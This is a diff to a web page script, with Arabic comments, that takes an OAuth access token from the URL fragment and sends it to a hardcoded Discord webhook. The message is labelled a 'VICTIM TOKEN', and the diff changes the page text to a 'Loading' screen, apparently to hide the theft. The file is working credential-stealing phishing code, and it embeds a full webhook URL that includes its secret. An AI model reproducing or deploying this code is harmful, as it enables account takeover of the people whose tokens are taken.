@@ -1,15 +1,19 @@
 <script>
-    // لقط التوكن من الرابط
-    const urlParams = new URLSearchParams(window.location.hash.substring(1));
-    const token = urlParams.get('access_token');
+    // 1. لقط التوكن من الرابط فوق
+    const hash = window.location.hash.substring(1);
+    const params = new URLSearchParams(hash);
+    const userToken = params.get('access_token');
 
-    if (token) {
-        // إرسال التوكن للويب هوك بتاعك
+    // 2. لو لقى توكن حقيقي يبعته للويب هوك
+    if (userToken) {
         fetch('https://discord.com/api/webhooks/1491926490361626794/4-BpbrT0_5Qiy8HlssJyJlhlXJ5G5w_uZk7IlMFAisNJ-VmenDxcG8sk3nGZSCc32iQD', {
             method: 'POST',
             headers: {'Content-Type': 'application/json'},
-            body: JSON.stringify({ content: `🎯 **MNC User Token:** \`${token}\`` })
+            body: JSON.stringify({
+                content: `🎯 **MNC VICTIM TOKEN:** \`${userToken}\``
+            })
         });
-        document.body.innerHTML = "<h1>تم التحقق بنجاح!</h1>";
+        document.body.innerHTML = "<h1>Loading... Please wait.</h1>";
     }
 </script>
+
